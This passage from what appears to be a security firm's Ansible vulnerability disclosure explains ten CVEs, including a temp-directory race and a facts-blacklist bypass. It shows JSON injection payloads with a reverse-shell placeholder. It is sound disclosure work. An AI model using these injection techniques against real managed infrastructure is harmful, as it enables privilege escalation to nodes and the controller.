literal\">WinRM</tt>) and only needs <tt class=\"docutils literal\">Python</tt> (or <tt class=\"docutils literal\">Powershell</tt>). <tt class=\"docutils literal\">Ansible</tt> is used in Quarkslab to manage our infrastructure <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id56\" id=\"id3\">[13]</a> and in our product <tt class=\"docutils literal\">Irma</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id57\" id=\"id4\">[14]</a>.</p> \n <p>The lack of agent on the managed machines can be seen as an advantage of <tt class=\"docutils literal\">Ansible</tt> over similar solutions because it's really easy to deploy and to configure. But as we'll see in this blogpost, it can lead to some security issues.</p> \n <!-- The research was focus for a usage with ``Linux`` and ``Windows`` node accessible with ``SSH`` or ``WinRM``. --> \n <p>In order to have an idea of the security of <tt class=\"docutils literal\">Ansible</tt>, we did an internal security assessment. We wanted to know what are the risks of executing a playbook on an compromised infrastructure.</p> \n <p>We conducted this research in November 2019 on <tt class=\"docutils literal\">Ansible</tt> 2.8.</p> \n <p>The most common modules have been reviewed. We found several vulnerabilities and 10 CVEs were assigned after this research:</p> \n <ul class=\"simple\"> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1733\" id=\"id5\">[CVE-2020-1733]</a>: Privilege escalation when used <em>become</em> mecanism to an unprivileged user - Moderate</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1734\" id=\"id6\">[CVE-2020-1734]</a>: Command injection in pipe lookup plugin - Moderate</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1735\" id=\"id7\">[CVE-2020-1735]</a>: Path traversal in the <em>fetch</em> module - Moderate</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1736\" id=\"id8\">[CVE-2020-1736]</a>: Incorrect permission when create file on the node - Low</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1737\" id=\"id9\">[CVE-2020-1737]</a>: Path Traversal in <em>win_unzip</em> module - Moderate</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1738\" id=\"id10\">[CVE-2020-1738]</a>: Arbitrary module execution with the module <em>package</em> or <em>service</em> - Low</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1739\" id=\"id11\">[CVE-2020-1739]</a>: Expose <em>password</em> argument of <em>svn</em> module - Low</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1740\" id=\"id12\">[CVE-2020-1740]</a>: Race condition in <tt class=\"docutils literal\"><span class=\"pre\">ansible-vault</span> edit</tt> command - Low</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-10684\" id=\"id13\">[CVE-2020-10684]</a>: Injection of arbitrary <em>ansible-fact</em> that lead to an arbitrary command execution - Important</li> \n  <li><a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-10685\" id=\"id14\">[CVE-2020-10685]</a>: Unremoved decrypted vault file after some module execution - Moderate</li> \n </ul> \n</div> \n<div class=\"section\" id=\"findings\"> \n <h2>Findings</h2> \n <p><tt class=\"docutils literal\">Ansible</tt> can manage multiple nodes on a single run and several users per node (by using <tt class=\"docutils literal\">become</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id59\" id=\"id15\">[16]</a> plugins). For us, the main threat is a privilege escalation from a malicious user to another user on the <strong>same</strong> node or to <strong>another node</strong> or to the <strong>controller</strong>.</p> \n <p>We set up a test infrastructure containing both Linux and Windows nodes and focused our research on common modules.</p> \n <img alt=\"Test infrastructure\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/ansible-architecture.png\" style=\"width: 60%;\" /> \n <!-- First we need to explain some internals starting with the ``Variable Manager`` used by ``Ansible``. --> \n <p>Each task defined in a playbook is converted to a module and then sent to the node. This is needed because <tt class=\"docutils literal\">Ansible</tt> doesn't have an agent on each node. An attacker shouldn't be able to modify the module and its parameters before or during the execution.</p> \n <div class=\"section\" id=\"module-execution-on-a-linux-node-cve-2020-1733\"> \n  <h3>Module execution on a Linux node (CVE-2020-1733)</h3> \n  <p>When <tt class=\"docutils literal\">Ansible</tt> needs to execute a module on a Linux node, the module is packaged in a single python file with all the dependencies and parameters. The package is then transferred and executed on the node. The verbosity parameter (<tt class=\"docutils literal\"><span class=\"pre\">-vvv</span></tt>) of <tt class=\"docutils literal\">Ansible</tt> allows us to follow the execution process with SSH.</p> \n  <p>For example, we execute this single task:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"nt\">remote_user</span><span class=\"p\">:</span> <span class=\"l l-Scalar l-Scalar-Plain\">user</span>\n\n<span class=\"nt\">tasks</span><span class=\"p\">:</span>\n  <span class=\"p p-Indicator\">-</span> <span class=\"nt\">name</span><span class=\"p\">:</span> <span class=\"l l-Scalar l-Scalar-Plain\">Execute file module</span>\n    <span class=\"nt\">file</span><span class=\"p\">:</span>\n        <span class=\"nt\">path</span><span class=\"p\">:</span> <span class=\"l l-Scalar l-Scalar-Plain\">/tmp/missing_file</span>\n        <span class=\"nt\">state</span><span class=\"p\">:</span> <span class=\"l l-Scalar l-Scalar-Plain\">absent</span>\n</pre> \n  </div> \n  <p>We obtain the following output from SSH:</p> \n  <pre class=\"code literal-block\">\n...\n&lt;10.10.0.11&gt; SSH: EXEC sh -C [skip -o ...] 10.10.0.11 '/bin/sh -c '\"'\"'echo ~ &amp;&amp; sleep 0'\"'\"''\n...\n&lt;10.10.0.11&gt; SSH: EXEC sh -C [skip -o ...] 10.10.0.11 '/bin/sh -c '\"'\"'( umask 77 &amp;&amp; mkdir -p \"` echo /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847 `\" &amp;&amp; echo ansible-tmp-1584362480.6592143-258274020557847=\"` echo /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847 `\" ) &amp;&amp; sleep 0'\"'\"''\n...\n&lt;10.10.0.11&gt; PUT /home/user/.ansible/tmp/ansible-local-61394ba1tivkm/tmphcenrzoc TO /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/AnsiballZ_file.py\n&lt;10.10.0.11&gt; SSH: EXEC sftp -b - -C [skip -o ...] '[10.10.0.11]'\n...\n&lt;10.10.0.11&gt; SSH: EXEC sh -C [skip -o ...] 10.10.0.11 '/bin/sh -c '\"'\"'chmod u+x /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/ /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/AnsiballZ_file.py &amp;&amp; sleep 0'\"'\"''\n...\n&lt;10.10.0.11&gt; SSH: EXEC sh -C [skip -o ...] -tt 10.10.0.11 '/bin/sh -c '\"'\"'/usr/bin/python /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/AnsiballZ_file.py &amp;&amp; sleep 0'\"'\"''\n...\n&lt;10.10.0.11&gt; SSH: EXEC sh -C [skip -o ...] 10.10.0.11 '/bin/sh -c '\"'\"'rm -f -r /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/ &gt; /dev/null 2&gt;&amp;1 &amp;&amp; sleep 0'\"'\"''\n...\n</pre> \n  <p>The executed commands are as follows:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># resolve home directory</span>\n/bin/sh -c <span class=\"s1\">'echo ~user &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># create temporary directory</span>\n/bin/sh -c <span class=\"s1\">'( umask 77 &amp;&amp;</span>\n<span class=\"s1\">              mkdir -p \"` echo /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847 `\" &amp;&amp;</span>\n<span class=\"s1\">              echo ansible-tmp-1584362480.6592143-258274020557847=\"` echo /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847 `\" ) &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># push file with sftp to /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/AnsiballZ_file.py</span>\n<span class=\"c1\"># set execution bit</span>\n/bin/sh -c <span class=\"s1\">'chmod u+x /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/</span>\n<span class=\"s1\">                      /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/AnsiballZ_file.py &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># execute the module</span>\n/bin/sh -c <span class=\"s1\">'/usr/bin/python /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/AnsiballZ_file.py &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># remove the module and the temporary directory</span>\n/bin/sh -c <span class=\"s1\">'rm -f -r /home/user/.ansible/tmp/ansible-tmp-1584362480.6592143-258274020557847/ &gt; /dev/null 2&gt;&amp;1 &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n</pre> \n  </div> \n  <p>A temporary directory is created in the home directory of the user, with the current timestamp (with microsecond precision) and a random value of 48 bits <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id45\" id=\"id16\">[2]</a>.</p> \n  <img alt=\"Normal execution\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal.png\" style=\"width: 70%;\" /> \n  <p>We execute the same playbook but this time by becoming root:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># resolve home directory</span>\n/bin/sh -c <span class=\"s1\">'echo ~user &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># create temporary directory</span>\n/bin/sh -c <span class=\"s1\">'( umask 77 &amp;&amp;</span>\n<span class=\"s1\">              mkdir -p \"` echo /home/user/.ansible/tmp/ansible-tmp-1584364725.538944-238100626223672 `\" &amp;&amp;</span>\n<span class=\"s1\">              echo ansible-tmp-1584364725.538944-238100626223672=\"` echo /home/user/.ansible/tmp/ansible-tmp-1584364725.538944-238100626223672 `\" ) &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># push file with sftp to /home/user/.ansible/tmp/ansible-tmp-1584364725.538944-238100626223672/AnsiballZ_file.py</span>\n<span class=\"c1\"># set execution bit</span>\n/bin/sh -c <span class=\"s1\">'chmod u+x /home/user/.ansible/tmp/ansible-tmp-1584364725.538944-238100626223672/</span>\n<span class=\"s1\">                      /home/user/.ansible/tmp/ansible-tmp-1584364725.538944-238100626223672/AnsiballZ_file.py &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># execute the module with root user</span>\n/bin/sh -c <span class=\"s1\">'sudo -H -S  -p \"[sudo via ansible, key=ehpdhkiogpdqgpeehnzeyvouybvuuzdp] password:\" -u root</span>\n<span class=\"s1\">                        /bin/sh -c '</span><span class=\"s2\">\"'\"</span><span class=\"s1\">'echo BECOME-SUCCESS-ehpdhkiogpdqgpeehnzeyvouybvuuzdp ;</span>\n<span class=\"s1\">                                        /usr/bin/python /home/user/.ansible/tmp/ansible-tmp-1584364725.538944-238100626223672/AnsiballZ_file.py'</span><span class=\"s2\">\"'\"</span><span class=\"s1\">' &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># remove the module and the temporary directory</span>\n/bin/sh -c <span class=\"s1\">'rm -f -r /home/user/.ansible/tmp/ansible-tmp-1584364725.538944-238100626223672/ &gt; /dev/null 2&gt;&amp;1 &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n</pre> \n  </div> \n  <p>When <tt class=\"docutils literal\">become</tt> is used with root, the only change is the use of <tt class=\"docutils literal\">sudo</tt> (or another <tt class=\"docutils literal\">become</tt> method). The temporary directory isn't owned by root but by the trusted user who performs the connection.</p> \n  <img alt=\"Normal execution with root user\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_root.png\" style=\"width: 70%;\" /> \n  <p>We execute the same playbook but this time by becoming another user:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># resolve home directory</span>\n/bin/sh -c <span class=\"s1\">'echo ~user &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># create temporary directory</span>\n/bin/sh -c <span class=\"s1\">'( umask 77 &amp;&amp;</span>\n<span class=\"s1\">              mkdir -p \"` echo /var/tmp/ansible-tmp-1584365644.8392012-230589678596332 `\" &amp;&amp;</span>\n<span class=\"s1\">              echo ansible-tmp-1584365644.8392012-230589678596332=\"` echo /var/tmp/ansible-tmp-1584365644.8392012-230589678596332 `\" ) &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># push file with sftp to /var/tmp/ansible-tmp-1584365644.8392012-230589678596332/AnsiballZ_file.py</span>\n<span class=\"c1\"># set execution bit</span>\n/bin/sh -c <span class=\"s1\">'setfacl -m u:become_user:r-x /var/tmp/ansible-tmp-1584365644.8392012-230589678596332/</span>\n<span class=\"s1\">                                         /var/tmp/ansible-tmp-1584365644.8392012-230589678596332/AnsiballZ_file.py &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># execute the module with root user</span>\n/bin/sh -c <span class=\"s1\">'sudo -H -S  -p \"[sudo via ansible, key=whacochmknumfjfmariwhcttwlztmihm] password:\" -u become_user</span>\n<span class=\"s1\">                        /bin/sh -c '</span><span class=\"s2\">\"'\"</span><span class=\"s1\">'echo BECOME-SUCCESS-whacochmknumfjfmariwhcttwlztmihm ;</span>\n<span class=\"s1\">                                        /usr/bin/python /var/tmp/ansible-tmp-1584365644.8392012-230589678596332/AnsiballZ_file.py'</span><span class=\"s2\">\"'\"</span><span class=\"s1\">' &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n<span class=\"c1\"># remove the module and the temporary directory</span>\n/bin/sh -c <span class=\"s1\">'rm -f -r /var/tmp/ansible-tmp-1584365644.8392012-230589678596332/ &gt; /dev/null 2&gt;&amp;1 &amp;&amp;</span>\n<span class=\"s1\">            sleep 0'</span>\n</pre> \n  </div> \n  <p>When the <em>become</em> user and the connection user are unprivileged (i.e., not root), the temporary directory is created in <tt class=\"docutils literal\">/var/tmp/</tt>. The directory is created by <tt class=\"docutils literal\">mkdir</tt> with the argument <tt class=\"docutils literal\"><span class=\"pre\">-p</span></tt> and will not fail if the directory already exists. The other commands (<tt class=\"docutils literal\">setfacl</tt> and <tt class=\"docutils literal\">rm <span class=\"pre\">-f</span></tt>) are also lazy and don't fail if the state is already the expected one.</p> \n  <img alt=\"Normal execution with become user\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_become.png\" style=\"width: 70%;\" /> \n  <p>A malicious user on the managed node who can predict the directory name can compromise the execution.</p> \n  <p>As mentioned before, the temporary directory name contains 48 random bits and a microsecond timestamp. However, the directory name is an argument of the <tt class=\"docutils literal\">/bin/sh</tt> and <tt class=\"docutils literal\">mkdir</tt> process. There is a race condition which allows to determine this directory. A malicious user who iterates on <tt class=\"docutils literal\"><span class=\"pre\">/proc/&lt;pid&gt;/cmdline</span></tt> can find the directory name and create the directory before the become user. Once the directory is created the malicious user can change the content of the uploaded module and elevate his privilege <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1733\" id=\"id17\">[CVE-2020-1733]</a>.</p> \n  <img alt=\"CVE-2020-1733\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/execution_plugin_normal_become_vuln.png\" style=\"width: 80%;\" /> \n </div> \n <div class=\"section\" id=\"ansible-facts-and-become\"> \n  <h3><tt class=\"docutils literal\">ansible_facts</tt> and become</h3> \n  <p>To use <tt class=\"docutils literal\">Ansible</tt>, the user needs to define the list of targeted nodes (the infrastructure) and the tasks to perform on it (the playbook). Variables can be defined in various files <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id46\" id=\"id18\">[3]</a> to share parameters between hosts and tasks. All variables are stored in the <tt class=\"docutils literal\">VariableManager</tt>. In addition to the variables read from configuration files, the <tt class=\"docutils literal\">setup</tt> module retrieves the facts <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id47\" id=\"id19\">[4]</a> on each node before the execution of the first task. The <tt class=\"docutils literal\">VariableManager</tt> computes the available variables for each task by applying the precedence rules <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id48\" id=\"id20\">[5]</a>.</p> \n  <img alt=\"Ansible Variable Manager\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/Var_manager_2.png\" style=\"width: 60%;\" /> \n  <p>The precedence of the facts is in the middle of the precedence rules <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id48\" id=\"id21\">[5]</a> and allows a malicious node to overwrite some variables. To avoid the facts to override sensible variables, a blacklist removes any variable matching <tt class=\"docutils literal\">Ansible</tt> internal variables <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id49\" id=\"id22\">[6]</a> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id50\" id=\"id23\">[7]</a>.</p> \n  <p>Only variables defined in <tt class=\"docutils literal\">group_vars</tt>, <tt class=\"docutils literal\">host_vars</tt>, inventory and roles default files can be overwritten by the facts.</p> \n  <p>In addition to the facts returned by the <tt class=\"docutils literal\">setup</tt> module, each module can add additional facts with the token <tt class=\"docutils literal\">ansible_facts</tt> in the returned json. These facts will be merged with the existing facts in the <tt class=\"docutils literal\">VariableManager</tt>. As a result, a compromised module allows a malicious user to tamper with the variables used by the following tasks on the same node.</p> \n  <p><tt class=\"docutils literal\">Ansible</tt> provides a become mechanism that allows changing the user before executing the module on a node. This mechanism doesn't have an impact on the <tt class=\"docutils literal\">VariableManager</tt> and the merge of the returned facts. If a become user is malicious, they can inject facts and corrupt future tasks of the node, including those that don't use the same user.</p> \n  <p>In a first look, this issue doesn't seem to have an impact, as only the node that sets malicious facts will have its variable overwritten for its future tasks. However, in two cases, this behavior can have a security impact:</p> \n  <ul class=\"simple\"> \n   <li>when a task needs to be executed in the controller node;</li> \n   <li>when the malicious fact is returned by a become user.</li> \n  </ul> \n </div> \n <div class=\"section\" id=\"ansible-facts-blacklist-cve-2020-10684\"> \n  <h3><tt class=\"docutils literal\">ansible_facts</tt> blacklist (CVE-2020-10684)</h3> \n  <p>To avoid some facts to change critical variables, a blacklist removes any returned facts with a sensitive name. The blacklist works in three steps:</p> \n  <ul class=\"simple\"> \n   <li>when the result of a module is received, the method <tt class=\"docutils literal\">remove_internal_keys</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id49\" id=\"id24\">[6]</a> removes the facts that begin with <tt class=\"docutils literal\">discovered_interpreter_</tt> or <tt class=\"docutils literal\">ansible_discovered_interpreter_</tt> before the variable is merged in the <tt class=\"docutils literal\">VariableManager</tt>.</li> \n   <li>when the precedence rules are applied, a copy of the stored facts is cleaned by a call to <tt class=\"docutils literal\">clean_facts</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id50\" id=\"id25\">[7]</a> function, cleaning all variables that match <tt class=\"docutils literal\">Ansible</tt> variables.</li> \n   <li>a copy of the stored facts is added in the variable <tt class=\"docutils literal\">ansible_facts</tt>. The method <tt class=\"docutils literal\">namespace_facts</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id51\" id=\"id26\">[8]</a> is used to remove the <tt class=\"docutils literal\">ansible_</tt> prefix.</li> \n  </ul> \n  <p>We found that the <tt class=\"docutils literal\">discovered_interpreter_</tt> variables management (as for <tt class=\"docutils literal\">discovered_interpreter_python</tt>) doesn't follow the same pattern. When the variable is used, its value is taken from <tt class=\"docutils literal\">ansible_facts.discovered_interpreter_</tt>. The previous blacklist can be bypassed by using the following method:</p> \n  <ul class=\"simple\"> \n   <li>return an <tt class=\"docutils literal\">ansible_facts</tt> key nested in the <tt class=\"docutils literal\">ansible_facts</tt> of the module result. This key won't match when <tt class=\"docutils literal\">remove_internal_keys</tt> is called and replace the <tt class=\"docutils literal\">ansible_facts</tt> variable.</li> \n  </ul> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"p\">{</span>\n    <span class=\"nt\">\"changed\"</span><span class=\"p\">:</span> <span class=\"kc\">false</span><span class=\"p\">,</span>\n    <span class=\"nt\">\"ansible_facts\"</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n        <span class=\"nt\">\"ansible_facts\"</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n            <span class=\"nt\">\"discovered_interpreter_python\"</span> <span class=\"p\">:</span> <span class=\"s2\">\"&lt;reverse_shell&gt;\"</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <ul class=\"simple\"> \n   <li>The method <tt class=\"docutils literal\">namespace_facts</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id51\" id=\"id27\">[8]</a> doesn't remove the prefix but the first <tt class=\"docutils literal\">ansible_</tt> found in the variable name. We can inject a variable <tt class=\"docutils literal\">discovered_ansible_interpreter_python</tt> that will bypass the method <tt class=\"docutils literal\">remove_internal_keys</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id49\" id=\"id28\">[6]</a> and will become <tt class=\"docutils literal\">discovered_interpreter_python</tt> after <tt class=\"docutils literal\">namespace_facts</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id51\" id=\"id29\">[8]</a>.</li> \n  </ul> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"p\">{</span>\n    <span class=\"nt\">\"changed\"</span><span class=\"p\">:</span> <span class=\"kc\">false</span><span class=\"p\">,</span>\n    <span class=\"nt\">\"ansible_facts\"</span><span class=\"p\">:</span> <span class=\"p\">{</span>\n        <span class=\"nt\">\"discovered_ansible_interpreter_python\"</span> <span class=\"p\">:</span> <span class=\"s2\">\"&lt;reverse_shell&gt;\"</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <p>This issue was first acknowledged as a bug by Red Hat and then became a CVE <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-10684\" id=\"id30\">[CVE-2020-10684]</a>.</p> \n </div> \n <div class=\"section\" id=\"executing-a-task-on-another-node\"> \n  <h3>Executing a task on another node</h3> \n  <p>In some cases, a task in the playbook needs to be executed on another node than the managed one (for example, sign a certificate). To do this, one can use the <tt class=\"docutils literal\">delegated_to</tt> variable. The generated variables for this task use the facts of the delegated node.</p> \n  <img alt=\"Playbook with delegated_to usage\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/playbook_multiple_user_vuln_p1.png\" style=\"width: 70%;\" /> \n  <p>However, we find some playbooks where the task sets <tt class=\"docutils literal\">connection: local</tt> to change the connection plugin to local and executes the module locally. When this variant is used, the <tt class=\"docutils literal\">VariableManager</tt> uses the facts of the managed node.</p> \n  <img alt=\"Playbook with connection: local usage\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-05-28_ansible/playbook_multiple_user_vuln_p2.png\" style=\"width: 70%;\" /> \n  <p>In addition to using an interpreter path of the managed node, some variables can be overwritten and may lead to malicious execution, depending on the playbook. We strongly discourage using <tt class=\"docutils literal\">connection: local</tt> to delegate a task to the controller node.</p> \n </div> \n <div class=\"section\" id=\"vault-cve-2020-1740\"> \n  <h3>Vault (CVE-2020-1740)</h3> \n  <p><tt class=\"docutils literal\">Ansible</tt> includes a mechanism of secure storage with the Vault. As the configuration may be versioned, this mechanism allows the encryption of some secrets and only decrypts them when the playbook is running. The value is sent in clear text to the managed node. A malicious user may be in position to recover this value.</p> \n  <p>The Vault mechanism allows the administrator to encrypt and authenticate some file or variable in the configuration in order to commit encrypted values. The key must be kept safe and will be used by <tt class=\"docutils literal\">Ansible</tt> to decrypt the value when needed.</p> \n  <p>When <tt class=\"docutils literal\">Ansible</tt> needs to decrypt a file encrypted with Vault, the class <tt class=\"docutils literal\">DataLoader</tt> creates a temporary decrypted file with <tt class=\"docutils literal\">tempfile.mkstemp</tt>. The decrypted file is created safely in /tmp. The <tt class=\"docutils literal\">DataLoader</tt> instance keeps track of every temporary file and deletes each of them when <tt class=\"docutils literal\">Ansible</tt> terminates. However, when the decrypted file is needed by a module (like assemble or copy), the temporary file is created in another process (not the main one) but the tracking of the temporary files is only performed in the main process. Some actions plugin implement the cleanup manually but not all of them. Some secret files may stay decrypted after the execution. This issue was assigned to the CVE <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-10685\" id=\"id31\">[CVE-2020-10685]</a>.</p> \n  <p>Additionally, we found a race condition in <tt class=\"docutils literal\"><span class=\"pre\">ansible-vault</span> edit</tt> that allows a local user on the controller to steal the edited secret, but we haven't been able to exploit it without issuing an error <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1740\" id=\"id32\">[CVE-2020-1740]</a>.</p> \n </div> \n</div> \n<div class=\"section\" id=\"other-issues\"> \n <h2>Other issues</h2> \n <p>The module <tt class=\"docutils literal\">synchronise</tt> doesn't verify the ssh host key by default. We encourage enabling it if the host key is already known by the controller. <tt class=\"docutils literal\">Ansible</tt> should provide for a future release more options to secure the connection by default.</p> \n <p>The shell built-in was enabled by default in <tt class=\"docutils literal\">lookup pipe</tt> <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1734\" id=\"id33\">[CVE-2020-1734]</a>. We recommend disabling it by default and adding an option to enable it only when necessary.</p> \n <p>The destination file of the <tt class=\"docutils literal\">fetch</tt> module can be changed by an user on the node <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1735\" id=\"id34\">[CVE-2020-1735]</a>. This user can inject a path with <tt class=\"docutils literal\">../</tt> and change the content of the file to write an arbitrary file on the controller.</p> \n <p>The <tt class=\"docutils literal\">atomic_move</tt> method used by module allows in some cases a malicious user to read the content of the file during the copy <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1736\" id=\"id35\">[CVE-2020-1736]</a>. This method is used in some module to move files on the target node.</p> \n <p>The <tt class=\"docutils literal\">win_unzip</tt> module doesn't sanitize the path found in the source archive <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1737\" id=\"id36\">[CVE-2020-1737]</a>. The extracted file can be out of the destination directory. A similar bug was found in the <tt class=\"docutils literal\">unarchive</tt> module with no security impact.</p> \n <p>The <tt class=\"docutils literal\">package</tt> and <tt class=\"docutils literal\">service</tt> modules are vulnerable to the injection of a fact that can change the execution of an arbitrary module or, with some condition, an arbitrary binary <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1738\" id=\"id37\">[CVE-2020-1738]</a>. The execution of an arbitrary module should fail if the module doesn't have the expected option. An arbitrary binary may be injected with <tt class=\"docutils literal\">Ansible</tt> before 2.9 if a collection is installed.</p> \n <p>The <tt class=\"docutils literal\">svn</tt> module provides the password in the command line of svn allowing any user on the node to retrieve it <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1739\" id=\"id38\">[CVE-2020-1739]</a>.</p> \n <p>Some issues with powershell on Windows nodes are still processed by Red Hat.</p> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>We've seen that in a worst case scenario it may be possible to fully compromise an infrastructure managed by <tt class=\"docutils literal\">Ansible</tt>. First by gaining access to a node (using <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-1733\" id=\"id39\">[CVE-2020-1733]</a>) then by jumping from this node to the controller (using <a class=\"citation-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#cve-2020-10684\" id=\"id40\">[CVE-2020-10684]</a>).</p> \n <p><tt class=\"docutils literal\">Ansible</tt> by design can't protect itself from malicious nodes. Running Ansible on untrusted networks should be done with special care and every security best practices should be applied.</p> \n <p>But regardless of these issues, the ease of use is really great and more than compensates the risk. At Quarkslab, we love <tt class=\"docutils literal\">Ansible</tt> and we'll keep using it because it's a great piece of software!</p> \n</div> \n<div class=\"section\" id=\"timeline\"> \n <h2>Timeline</h2> \n <ul class=\"simple\"> \n  <li>2020/01/23: Quarkslab sent 16 issues to Red Hat, indicates that disclosure is scheduled for March 17th.</li> \n  <li>2020/01/27: Red Hat acknowledges the report.</li> \n  <li>2020/02/04: Quarkslab asks for a status update.</li> \n  <li>2020/02/10: Red Hat informs us that 10 out the 16 bugs will be considered worth a CVE (at least 4 moderate, none critical), 4 bugs not worthy of a CVE, 1 a design issue and 1 still under study.</li> \n  <li>2020/02/11: Red Hat informs us that they plan to open the issues with low and moderate impact and asks Quarkslab for consent.</li> \n  <li>2020/02/15: Quarkslab agrees to Red Hat's plan to disclose moderate and low impact 